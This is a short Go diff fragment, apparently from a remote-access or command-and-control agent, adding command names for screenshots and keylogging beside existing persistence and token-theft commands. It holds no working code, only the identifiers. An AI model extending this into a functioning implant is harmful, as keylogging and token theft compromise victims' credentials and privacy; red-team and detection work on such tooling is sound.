@@ -31,6 +31,10 @@ const (
 	CmdPersist    = "persist"
 	CmdTokenList  = "token_list"
 	CmdTokenSteal = "token_steal"
+	CmdScreenshot = "screenshot"
+	CmdKeylogStart = "keylog_start"
+	CmdKeylogStop  = "keylog_stop"
+	CmdKeylogDump  = "keylog_dump"
 )
 
 // AgentRequest est la structure générique des requêtes de l'agent
